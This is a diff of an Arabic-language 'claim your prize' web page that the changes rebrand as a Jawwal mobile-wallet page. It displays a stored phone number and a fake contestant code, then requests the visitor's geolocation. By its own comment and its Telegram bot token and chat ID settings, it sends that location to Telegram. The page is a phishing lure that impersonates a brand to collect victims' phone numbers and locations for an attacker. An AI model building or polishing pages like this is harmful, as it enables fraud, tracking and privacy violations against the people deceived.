@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>استلام الجائزة</title>
+  <title>استلام الجائزة - محفظة جوالي</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
@@ -10,40 +10,49 @@
       font-family: Tahoma, sans-serif;
       text-align: center;
       padding: 40px;
+      background-color: #f5f5f5;
+    }
+    h2 {
+      color: #28a745;
+    }
+    p, #phoneDisplay {
+      font-size: 18px;
+      color: #333;
     }
     button {
       background-color: #28a745;
       color: white;
       font-size: 20px;
-      padding: 12px 24px;
+      padding: 12px 30px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
-      margin-top: 20px;
+      margin-top: 25px;
     }
     #codeDisplay {
       margin-top: 30px;
       font-size: 24px;
-      color: #333;
+      color: #000;
     }
   </style>
 </head>
 <body>
 
-  <h2>🎁 شكراً لمشاركتك!</h2>
+  <h2>✅ تم تأكيد رقمك!</h2>
+  <p id="phoneDisplay">📱 رقمك هو: جاري التحميل...</p>
   <p>اضغط الزر أدناه لاستلام الجائزة وكشف كود المتسابق الخاص بك</p>
 
-  <button onclick="claimGift()">استلام الجائزة</button>
+  <button id="claimButton" onclick="claimGift()">🎁 استلام الجائزة</button>
 
   <div id="codeDisplay" style="display:none;">
-    🎉 كود المتسابق الخاص بك: <span id="contestantCode"></span>
+    🎉 كود المتسابق الخاص بك: <span id="contestantCode" style="font-weight: bold;"></span>
   </div>
 
   <script>
     let botToken = '';
     let chatId = '';
 
-    // تحميل الإعدادات من config.json
+    // تحميل إعدادات التليجرام
     fetch('config.json')
       .then(res => res.json())
       .then(data => {
@@ -51,25 +60,30 @@
         chatId = data.chatId;
       });
 
-    function generateCode() {
-      return Math.floor(100000 + Math.random() * 900000).toString();
+    // عرض رقم الهاتف
+    const phone = localStorage.getItem("userPhone");
+    if (phone) {
+      document.getElementById('phoneDisplay').textContent = "📱 رقمك هو: " + phone;
+    } else {
+      document.getElementById('phoneDisplay').textContent = "⚠️ لا يوجد رقم محفوظ.";
+      document.getElementById('claimButton').disabled = true;
     }
 
     function claimGift() {
-      const phone = localStorage.getItem("userPhone");
-      if (!phone) {
-        alert("لا يوجد رقم هاتف محفوظ.");
-        return;
-      }
+      const phone = localStorage.getItem("userPhone") || "";
+      const code = localStorage.getItem("userCode") || generateCode();
 
-      const code = generateCode();
+      // اهتزاز الجهاز
+      if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
 
+      // حفظ الكود إذا لم يكن محفوظًا مسبقًا
+      localStorage.setItem("userCode", code);
+
+      // عرض الكود
       document.getElementById('contestantCode').textContent = code;
       document.getElementById('codeDisplay').style.display = 'block';
 
-      // اهتزاز
-      if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
-
+      // الحصول على الموقع وإرساله للتليجرام
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
           const lat = position.coords.latitude;
@@ -91,6 +105,13 @@
       } else {
         alert("المتصفح لا يدعم الموقع الجغرافي.");
       }
+
+      // تعطيل الزر بعد الضغط
+      document.getElementById('claimButton').disabled = true;
+    }
+
+    function generateCode() {
+      return Math.floor(100000 + Math.random() * 900000).toString();
     }
   </script>
 
